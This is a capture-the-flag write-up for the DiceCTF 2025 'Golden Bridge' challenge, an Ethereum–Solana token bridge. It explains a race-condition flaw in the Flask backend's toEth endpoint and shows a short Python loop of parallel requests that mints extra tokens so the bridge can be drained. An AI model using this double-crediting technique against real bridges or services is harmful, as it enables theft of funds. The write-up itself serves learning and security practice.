# DiceCTF 2025 Quals - Golden Bridge

## Overview

An Ethereum <> Solana bridge with the following UI is provided:

![](assets/ui.png)

A rough architecture overview:
- Geth as the Ethereum node  
- Solana Test Validator as the Solana node  
- Web application built with Flask  
- Solidity contracts  

There are four Solidity contracts with the following roles:
- `Feather`: A basic ERC20 token  
- `Bubble`: A wrapped version of Feather  
- `Bridge`: Manages token balances on the Ethereum side  
- `Setup`: Deploys and manages the above contracts, and includes the `isSolved()` function

The goal is to make `isSolved()` return `true`. If this is achieved, the web application reveals the flag:

```python
@app.get("/flag")
def flag():
  try:
    if eth_Setup.functions.isSolved().call():
      return os.environ.get("FLAG", "dice{test_flag}")
    return "no flag for u >:D", 403
  except Exception:
    return "no flag for u >:D", 403
```

The `Setup` contract executes the following constructor, which sends 1 billion `Bubble` tokens to the `Bridge` contract:

```solidity
contract Setup {
  Feather public immutable feather;
  Bubble public immutable bubble;
  Bridge public immutable bridge;
  bool private airdropped;

  constructor() {
    airdropped = false;
    uint256 liquidity = 1_000_000_000;
    feather = new Feather();
    feather.mint(address(this), liquidity);
    bubble = new Bubble(feather);
    feather.approve(address(bubble), liquidity);
    bubble.wrap(liquidity);
    bridge = new Bridge(bubble);
    bubble.transfer(address(bridge), liquidity);
    bridge.changeOwner(msg.sender);
  }

  (snip)
```

When the `Bubble` token balance in the `Bridge` contract becomes `0`, `isSolved()` returns `true`:

```solidity
  function isSolved() external view returns (bool) {
    return bubble.balanceOf(address(bridge)) == 0;
  }
```

Additionally, the `Setup` contract provides an `airdrop()` function that grants `10 Feather` to the player:

```solidity
  function airdrop() external {
    if (airdropped) revert("no more airdrops :(");
    feather.mint(msg.sender, 10);
    airdropped = true;
  }
```

## Solution

I first reviewed the `Bridge` contract and did not notice any interesting issues:

```solidity
contract Bridge {
  address public owner;
  Bubble public immutable bubble;
  mapping(address => uint256) public accounts;

  constructor(Bubble bubble_) {
    owner = msg.sender;
    bubble = bubble_;
  }

  modifier onlyOwner() {
    require(msg.sender == owner, "not owner");
    _;
  }

  function changeOwner(address newOwner) external onlyOwner {
    owner = newOwner;
  }

  function deposit(uint256 amount) external {
    bubble.transferFrom(msg.sender, address(this), amount);
    accounts[msg.sender] += amount;
  }

  function withdraw(uint256 amount) external {
    require(accounts[msg.sender] >= amount, "Insufficient BBL in Bridge");
    accounts[msg.sender] -= amount;
    bubble.transfer(msg.sender, amount);
  }

  function fromBridge(address recipient, uint256 amount) external onlyOwner {
    accounts[recipient] += amount;
  }

  function toBridge(address recipient, uint256 amount) external onlyOwner {
    require(accounts[recipient] >= amount, "Insufficient BBL in Bridge");
    accounts[recipient] -= amount;
  }
}
```

Then, I checked the off-chain part and suspected a potential race-condition-like behavior in the `toEth` function in the web application: 

```python
# transfer and burn $BBL on the Solana side, then
# credit $BBL into the Bridge on the Ethereum side
@app.post("/toEth")
def toEth():
  try:
    key = request.json["key"]
    if not isinstance(key, str):
      return "Invalid key", 400
    amount = request.json["amount"]
    if not (isinstance(amount, int) and amount > 0):
       return "Invalid amount", 400
    target = request.json["target"]
    if not (isinstance(target, str) and target.startswith("0x")):
      return "Invalid target", 400
    
    src = Keypair.from_json(key)
    src_ata = spl_token.get_associated_token_address(src.pubkey(), sol_bbl.pubkey(), TOKEN_PROGRAM_ID)
    if solana.get_account_info(src_ata).value is None:
      return "Solana account does not have an associated token account for $BBL", 400
    
    # bruh SPLToken doesn't let us compose two instructions
    recent_blockhash = solana.get_latest_blockhash().value.blockhash
    ixs = [
      spl_token.transfer(
        spl_token.TransferParams(
          program_id=TOKEN_PROGRAM_ID,
          source=src_ata,
          dest=sol_bridge_ata,
          owner=src.pubkey(),
          amount=amount,
          signers=[src.pubkey()],
        )
      ),
      spl_token.burn(
        spl_token.BurnParams(
          program_id=TOKEN_PROGRAM_ID,
          account=sol_bridge_ata,
          mint=sol_bbl.pubkey(),
          owner=sol_bridge.pubkey(),
          amount=amount,
          signers=[sol_bridge.pubkey()],
        )
      )
    ]
    solana.send_transaction(
      SolanaTransaction(
        [sol_bridge, src],
        SolanaMessage.new_with_blockhash(ixs, src.pubkey(), recent_blockhash),
        recent_blockhash
      )
    )
    
    eth_transact(eth_Bridge.functions.fromBridge(target, amount), eth_deployer)
    return f"Successfully transferred your $BBL!", 200
  except Exception as e:
    app.logger.error(traceback.format_exc())
    return str(e), 400
```

This function bridges tokens from Solana to Ethereum by burning tokens on the Solana side and minting them on the Ethereum side:

```python
    solana.send_transaction(
      SolanaTransaction(
        [sol_bridge, src],
        SolanaMessage.new_with_blockhash(ixs, src.pubkey(), recent_blockhash),
        recent_blockhash
      )
    )
    
    eth_transact(eth_Bridge.functions.fromBridge(target, amount), eth_deployer)
```

The `eth_transact` function itself is straightforward and seems safe:

```python
def eth_transact(fun: ContractFunction, signer: EthAccount):
  tx = fun.build_transaction({
    "from": signer.address,
    "nonce": w3.eth.get_transaction_count(signer.address),
  })
  tx_signed = signer.sign_transaction(tx)
  w3.eth.send_raw_transaction(tx_signed.raw_transaction)
```

Also, if the Solana account lacks sufficient tokens, the transaction fails as follows:

```
Traceback (most recent call last):
  File "/bridge/app.py", line 147, in toEth
    res = solana.send_transaction(
      SolanaTransaction(
    ...<3 lines>...
      )
    )
  File "/usr/local/lib/python3.13/site-packages/solana/rpc/api.py", line 1004, in send_transaction
    return self.send_raw_transaction(bytes(txn), opts=tx_opts)
           ~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.13/site-packages/solana/rpc/api.py", line 972, in send_raw_transaction
    resp = self._provider.make_request(body, SendTransactionResp)
  File "/usr/local/lib/python3.13/site-packages/solana/exceptions.py", line 45, in argument_decorator
    return func(*args, **kwargs)
  File "/usr/local/lib/python3.13/site-packages/solana/rpc/providers/http.py", line 62, in make_request
    return _parse_raw(raw, parser=parser)
  File "/usr/local/lib/python3.13/site-packages/solana/rpc/providers/core.py", line 98, in _parse_raw
    raise RPCException(parsed)
solana.rpc.core.RPCException: SendTransactionPreflightFailureMessage { message: "Transaction simulation failed: Error processing Instruction 0: custom program error: 0x1", data: RpcSimulateTransactionResult(RpcSimulateTransactionResult { err: Some(InstructionError(0, Custom(1))), logs: Some(["Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA invoke [1]", "Program log: Instruction: Transfer", "Program log: Error: insufficient funds", "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA consumed 4381 of 400000 compute units", "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA failed: custom program error: 0x1"]), accounts: None, units_consumed: Some(4381), return_data: None, inner_instructions: None, replacement_blockhash: None }) }
```

However, this validation is insufficient and vulnerable. If the function is called twice rapidly, the last call may use outdated state, bypassing the intended checks.
As a result, it becomes possible to mint more tokens on Ethereum than actually burned on Solana. For example:
- A player holding `1 Bubble` calls `toEth` twice nearly simultaneously with `amount = 1`.
- Due to outdated state in the `send_transaction` call, the `insufficient funds error` does not occur.
- Consequently, the Ethereum-side minting happens twice, resulting in `2 Bubble`.

By exploiting this vulnerability, tokens can be doubled repeatedly, effectively allowing for **infinite minting**. Using this method, I multiplied the tokens tenfold at each step:

```python
# toSol
payload = {
    "key": info["ethereum"]["private_key"],
    "amount": balance,
    "target": info["solana"]["pubkey"],
}
headers = {"Content-Type": "application/json"}
httpx.post(f"{INSTANCE_URL}/toSol", json=payload, headers=headers)

time.sleep(20)

# toEth
for j in tqdm(range(10)):
    payload = {
        "key": str(info["solana"]["keypair"]),
        "amount": balance,
        "target": info["ethereum"]["address"],
    }
    headers = {"Content-Type": "application/json"}
    httpx.post(f"{INSTANCE_URL}/toEth", json=payload, headers=headers)
```

With the infinitely minted tokens, it becomes possible to drain all `Bubble` tokens from the `Bridge`. The final solver was divided into several components:
- [solve.fish](./solve.fish): The overall solver script  
- [Exploit.s.sol](./Exploit.s.sol): Handles smart contract interactions  
- [race.py](./race.py): Triggers the race-condition-like bug and performs infinite minting

Flag: `dice{https://www.youtube.com/watch?v=iRJB6DotUsU&si=dicectf2025_cAdPaVDd8mI}`
